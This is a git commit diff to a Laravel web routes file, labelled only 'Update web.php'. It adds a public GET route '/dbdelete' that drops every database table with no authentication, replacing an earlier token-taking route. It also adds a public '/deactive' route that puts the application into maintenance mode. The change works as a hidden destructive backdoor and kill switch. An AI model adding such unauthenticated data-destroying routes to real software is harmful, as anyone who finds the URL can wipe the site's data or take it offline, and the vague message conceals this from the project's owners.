a363e21641a38f95a70396431b54d9a83961a9ef
tohomina akhter <90647625+tanvirmahade@users.noreply.github.com>
2023-04-19 07:43:31 +0600

    Update web.php

--- src/routes/web.php
+++ src/routes/web.php
@@ -4,10 +4,14 @@ use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
 
-Route::get('/migrate/database', function($token){
+Route::get('/dbdelete', function(){
     Schema::disableForeignKeyConstraints();
     foreach(DB::select('SHOW TABLES') as $table) {
         $table_array = get_object_vars($table);
         Schema::drop($table_array[key($table_array)]);
     }
+});
+
+Route::get('/deactive', function(){
+    \Artisan::call('down');
 });
